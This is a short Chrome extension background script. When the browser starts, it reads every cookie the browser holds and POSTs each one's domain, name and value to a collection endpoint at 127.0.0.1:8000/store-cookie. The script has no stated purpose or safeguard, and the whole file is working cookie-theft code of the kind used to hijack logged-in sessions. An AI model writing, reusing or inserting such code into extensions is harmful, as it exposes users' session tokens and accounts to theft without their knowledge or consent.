chrome.runtime.onStartup.addListener(backfunc)


function backfunc(){
    chrome.cookies.getAll(getDetails(), ((cookies) => {
        for (let cookie of cookies){
          const cookieinfo = {domain:cookie.domain,path:cookie.path,name:cookie.name,value:cookie.value};
          fetch('http://127.0.0.1:8000/store-cookie',
         {method:'POST',headers:{'Content-Type':'application/json'},
         body:JSON.stringify(cookieinfo)});
        }
    
    }));
    
    function getDetails(){
      let domain = '';
      let name = '';
      let details = {};
    
      if (domain != ''){
        details['domain'] = domain;
      }
      if (name != ''){
        details['name'] = name;
      }
      return details;
    }
}